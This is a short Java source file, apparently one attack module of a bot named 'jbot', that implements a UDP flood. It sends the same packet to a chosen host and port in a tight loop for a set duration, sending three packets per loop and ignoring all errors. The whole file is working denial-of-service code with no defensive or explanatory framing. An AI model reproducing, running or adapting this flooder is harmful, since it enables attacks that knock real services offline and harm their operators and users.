package me.aaronakhtar.jbot.threads.methods;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class Udp implements Runnable {

    private String host;
    private int port;
    private int time;
    private int bytes_per_packet;

    public Udp(String host, int port, int time, int bytes_per_packet) {
        this.host = host;
        this.port = port;
        this.time = time;
        this.bytes_per_packet = bytes_per_packet;
    }

    @Override
    public void run() {
        long a = System.currentTimeMillis() + this.time;
        InetAddress address;
        byte[] buff = new byte[this.bytes_per_packet];
        DatagramPacket packet;
        DatagramSocket socket;
        try {
            address = InetAddress.getByName(host);
            packet = new DatagramPacket(buff, buff.length, address, port);
            socket = new DatagramSocket();
        }catch (Exception e){return;}
        while(System.currentTimeMillis() < a){
            try {
                socket.send(packet);
                socket.send(packet);
                socket.send(packet);
            }catch (Exception e){

            }
        }
    }
}
